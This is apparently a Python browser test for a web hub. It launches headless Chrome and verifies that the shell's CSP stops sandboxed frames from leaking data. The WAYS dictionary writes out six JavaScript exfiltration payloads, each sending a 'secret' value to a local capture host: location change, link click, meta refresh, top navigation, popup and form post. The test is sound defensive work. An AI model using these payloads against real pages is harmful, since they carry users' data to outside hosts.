"""A made page can't carry data off the hub by navigating its own frame
(review D5), checked in a real browser: the shell's ``frame-src 'self'``
governs every navigation of the frames it embeds, whoever starts it, and the
page's sandbox has no forms, popups or top navigation. Skipped without
Chrome/Chromium. Every server and browser run has a hard timeout."""
from __future__ import annotations

import http.server
import shutil
import subprocess
import threading

import pytest

from rook.core2.hub.doors.web.site import PAGE_CSP, SHELL_CSP, inject

CHROME = next((shutil.which(b) for b in ("google-chrome-stable", "google-chrome", "chromium", "chromium-browser")
               if shutil.which(b)), None)
pytestmark = pytest.mark.skipif(CHROME is None, reason="no Chrome or Chromium")

WAYS = {
    "location": "location = OUT + '/location?d=secret'",
    "link": "var a = document.createElement('a'); a.href = OUT + '/link?d=secret'; document.body.appendChild(a); a.click()",
    "refresh": "document.write('<meta http-equiv=refresh content=\"0;url=' + OUT + '/refresh?d=secret\">')",
    "top": "try { top.location = OUT + '/top?d=secret' } catch (e) {}",
    "popup": "window.open(OUT + '/popup?d=secret')",
    "form": "document.body.innerHTML = '<form method=post action=\"' + OUT + '/form\"><input name=d value=secret></form>';"
            " document.forms[0].submit()",
}


def _serve(handler) -> http.server.ThreadingHTTPServer:
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def _run(shell_csp: str, tmp_path) -> list[str]:
    hits: list[str] = []

    class Out(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def _hit(self):
            hits.append(self.path)
            self.send_response(204)
            self.end_headers()
        do_GET = do_POST = _hit

    out = _serve(Out)
    base = f"http://127.0.0.1:{out.server_address[1]}"

    class Hub(http.server.BaseHTTPRequestHandler):
        def log_message(self, *a):
            pass

        def do_GET(self):
            if self.path == "/":
                frames = "".join(f"<iframe sandbox='allow-scripts' src='/frame/{w}'></iframe>" for w in WAYS)
                body, csp = f"<!doctype html><body>{frames}</body>", shell_csp
            else:
                way = WAYS[self.path.rsplit("/", 1)[1]]
                doc = f"<!doctype html><html><head></head><body><script>var OUT = '{base}'; {way}</script></body></html>"
                body, csp = inject(doc, {"page": "page/x", "title": "x", "caps": [], "events": []}), PAGE_CSP
            data = body.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.send_header("Content-Security-Policy", csp)
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    hub = _serve(Hub)
    try:
        subprocess.run([CHROME, "--headless=new", "--no-sandbox", "--disable-gpu", "--no-first-run",
                        f"--user-data-dir={tmp_path / 'profile'}", "--virtual-time-budget=5000", "--dump-dom",
                        f"http://127.0.0.1:{hub.server_address[1]}/"],
                       capture_output=True, timeout=60, check=False)
    finally:
        hub.shutdown()
        out.shutdown()
    return hits


def test_a_page_cannot_navigate_its_frame_off_the_hub(tmp_path):
    # The harness sees navigations when the shell lets them through ...
    leaked = _run("default-src *", tmp_path / "control")
    assert any(h.startswith("/location") for h in leaked), leaked
    # ... and the real shell's policy stops every one of them.
    assert "frame-src 'self'" in SHELL_CSP
    assert _run(SHELL_CSP, tmp_path / "shell") == []
